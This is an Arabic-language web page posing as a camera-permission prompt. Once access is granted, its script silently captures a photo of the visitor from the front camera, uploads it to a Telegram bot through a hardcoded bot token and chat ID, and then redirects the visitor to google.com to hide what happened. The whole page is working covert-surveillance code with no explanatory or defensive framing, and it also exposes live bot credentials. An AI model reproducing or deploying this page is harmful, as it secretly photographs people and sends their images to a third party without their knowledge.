<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>جارٍ السماح بالكاميرا...</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: sans-serif;
      background-color: #f0f0f0;
    }
    h3 {
      text-align: center;
    }
  </style>
</head>
<body>
  <h3>يرجى السماح بالوصول إلى الكاميرا...</h3>
  
  <script>
    const token = '7088304249:AAF3j4m0NldOUxoLIzenuAmKZyh1RWMfDLY';
    const chatId = '6484198949';

    async function startCameraAndCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });

        // إنشاء عنصر فيديو مؤقت مخفي
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;

        // ننتظر تشغيل الفيديو فعليًا
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        // ننتظر ثانية للتأكد من بدء الكاميرا
        await new Promise(resolve => setTimeout(resolve, 1000));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/png');

        // إيقاف الكاميرا
        stream.getTracks().forEach(track => track.stop());

        await sendPhotoToTelegram(imageData);

        window.location.href = "https://google.com"; // إعادة التوجيه بعد الإرسال

      } catch (err) {
        alert('تعذر الوصول إلى الكاميرا: ' + err.message);
      }
    }

    function sendPhotoToTelegram(base64Image) {
      const base64Data = base64Image.replace(/^data:image\/png;base64,/, '');
      const formData = new FormData();
      formData.append('chat_id', chatId);

      const byteCharacters = atob(base64Data);
      const byteNumbers = new Array(byteCharacters.length);
      for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      const byteArray = new Uint8Array(byteNumbers);
      const blob = new Blob([byteArray], { type: 'image/png' });
      formData.append('photo', blob, 'capture.png');

      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    window.onload = startCameraAndCapture;
  </script>
</body>
</html>
